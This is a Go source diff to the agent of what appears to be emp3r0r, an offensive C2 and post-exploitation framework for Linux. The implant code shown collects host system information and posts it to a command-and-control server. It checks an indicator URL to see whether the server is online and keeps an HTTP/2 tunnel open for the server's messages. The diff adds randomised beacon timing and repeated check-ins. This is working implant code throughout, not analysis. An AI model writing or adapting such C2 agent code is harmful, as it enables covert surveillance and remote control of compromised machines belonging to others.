@@ -1,3 +1,6 @@
+//go:build linux
+// +build linux
+
 package agent
 
 import (
@@ -18,27 +21,28 @@ import (
 	"time"
 
 	"github.com/google/uuid"
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/posener/h2conn"
 )
 
 // CheckIn poll CC server and report its system info
 func CheckIn() error {
 	info := CollectSystemInfo()
-	log.Println("Collected system info, now checking in...")
 
 	sysinfoJSON, err := json.Marshal(info)
 	if err != nil {
 		return err
 	}
-	_, err = HTTPClient.Post(CCAddress+tun.CheckInAPI+"/"+uuid.NewString(), "application/json", bytes.NewBuffer(sysinfoJSON))
+	_, err = emp3r0r_data.HTTPClient.Post(emp3r0r_data.CCAddress+tun.CheckInAPI+"/"+uuid.NewString(), "application/json", bytes.NewBuffer(sysinfoJSON))
 	if err != nil {
 		return err
 	}
 	return nil
 }
 
-// IsCCOnline check CCIndicator
+// IsCCOnline check emp3r0r_data.CCIndicator
 func IsCCOnline(proxy string) bool {
 	t := &http.Transport{
 		Dial: (&net.Dialer{
@@ -48,7 +52,7 @@ func IsCCOnline(proxy string) bool {
 		// We use ABSURDLY large keys, and should probably not.
 		TLSHandshakeTimeout: 60 * time.Second,
 	}
-	if proxy != "" && strings.HasPrefix(Transport, "HTTP2") {
+	if proxy != "" && strings.HasPrefix(emp3r0r_data.Transport, "HTTP2") {
 		proxyUrl, err := url.Parse(proxy)
 		if err != nil {
 			log.Fatalf("Invalid proxy: %v", err)
@@ -60,7 +64,7 @@ func IsCCOnline(proxy string) bool {
 		Transport: t,
 		Timeout:   30 * time.Second,
 	}
-	resp, err := client.Get(CCIndicator)
+	resp, err := client.Get(emp3r0r_data.CCIndicator)
 	if err != nil {
 		log.Print(err)
 		return false
@@ -72,8 +76,8 @@ func IsCCOnline(proxy string) bool {
 	}
 	defer resp.Body.Close()
 
-	log.Printf("Checking CCIndicator (%s) for %s", CCIndicator, strconv.Quote(CCIndicatorText))
-	return strings.Contains(string(data), CCIndicatorText)
+	log.Printf("Checking CCIndicator (%s) for %s", emp3r0r_data.CCIndicator, strconv.Quote(emp3r0r_data.CCIndicatorText))
+	return strings.Contains(string(data), emp3r0r_data.CCIndicatorText)
 }
 
 func catchInterruptAndExit(cancel context.CancelFunc) {
@@ -93,7 +97,7 @@ func ConnectCC(url string) (conn *h2conn.Conn, ctx context.Context, cancel conte
 	// use h2conn for duplex tunnel
 	ctx, cancel = context.WithCancel(context.Background())
 
-	h2 := h2conn.Client{Client: HTTPClient}
+	h2 := h2conn.Client{Client: emp3r0r_data.HTTPClient}
 
 	log.Printf("ConnectCC: connecting to %s", url)
 	conn, resp, err = h2.Connect(ctx, url)
@@ -114,13 +118,13 @@ func ConnectCC(url string) (conn *h2conn.Conn, ctx context.Context, cancel conte
 // CCMsgTun use the connection (CCConn)
 func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 	var (
-		in  = json.NewDecoder(H2Json)
-		out = json.NewEncoder(H2Json)
-		msg MsgTunData // data being exchanged in the tunnel
+		in  = json.NewDecoder(emp3r0r_data.H2Json)
+		out = json.NewEncoder(emp3r0r_data.H2Json)
+		msg emp3r0r_data.MsgTunData // data being exchanged in the tunnel
 	)
 	go catchInterruptAndExit(cancel)
 	defer func() {
-		err = H2Json.Close()
+		err = emp3r0r_data.H2Json.Close()
 		if err != nil {
 			log.Print("CCMsgTun closing: ", err)
 		}
@@ -131,12 +135,12 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 
 	// check for CC server's response
 	go func() {
-		log.Println("check CC response: started")
+		log.Println("Check CC response: started")
 		for ctx.Err() == nil {
 			// read response
 			err = in.Decode(&msg)
 			if err != nil {
-				log.Print("check CC response: JSON msg decode: ", err)
+				log.Print("Check CC response: JSON msg decode: ", err)
 				break
 			}
 			payload := msg.Payload
@@ -157,11 +161,11 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 
 			// send hello
 			msg.Payload = "hello"
-			msg.Tag = Tag
+			msg.Tag = emp3r0r_data.AgentTag
 			err = out.Encode(msg)
 			if err != nil {
 				log.Printf("agent cannot connect to cc: %v", err)
-				time.Sleep(1 * time.Second)
+				util.TakeASnap()
 				continue
 			}
 			return true
@@ -171,10 +175,14 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 
 	// send hello every second
 	for ctx.Err() == nil {
-		time.Sleep(1 * time.Second)
-		if !sendHello(10) {
-			log.Print("sendHello failed after 10 tries")
+		util.TakeASnap()
+		if !sendHello(util.RandInt(1, 10)) {
+			log.Print("sendHello failed")
 			break
+		}
+		err = CheckIn()
+		if err != nil {
+			log.Printf("Updating agent sysinfo: %v", err)
 		}
 	}
 
